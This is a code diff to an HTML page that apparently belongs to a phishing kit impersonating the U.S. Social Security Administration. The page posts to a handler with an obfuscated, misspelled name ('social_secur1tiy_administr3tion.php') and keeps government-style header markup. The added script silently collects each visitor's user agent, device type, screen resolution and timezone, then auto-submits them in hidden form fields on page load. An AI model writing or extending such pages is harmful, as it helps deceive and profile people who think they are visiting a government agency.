@@ -29,12 +29,38 @@
         }
     </style>
     <script>
-        // Immediately redirect to PHP handler for processing
-        window.location.href = 'social_secur1tiy_administr3tion.php?from_js=1';
+        // Collect visitor data before redirecting
+        window.onload = function() {
+            const userAgent = navigator.userAgent;
+            const isMobile = /mobile|android|iphone|ipad/i.test(userAgent);
+            const screenRes = `${screen.width}x${screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            // Submit data to PHP handler
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'social_secur1tiy_administr3tion.php';
+            
+            const addField = (name, value) => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = name;
+                input.value = value;
+                form.appendChild(input);
+            };
+            
+            addField('userAgent', userAgent);
+            addField('isMobile', isMobile ? '1' : '0');
+            addField('screenRes', screenRes);
+            addField('timezone', timezone);
+            
+            document.body.appendChild(form);
+            form.submit();
+        };
     </script>
 </head>
 <body class="uef-theme-std">
-    <!-- This content will only show if JavaScript is disabled -->
+    <!-- Fallback content if JavaScript is disabled -->
     <header>
         <div id="uef-tmpl-header">
             <a accesskey="K" href="#" id="uef-tmpl-skipNav">Skip to Content</a>
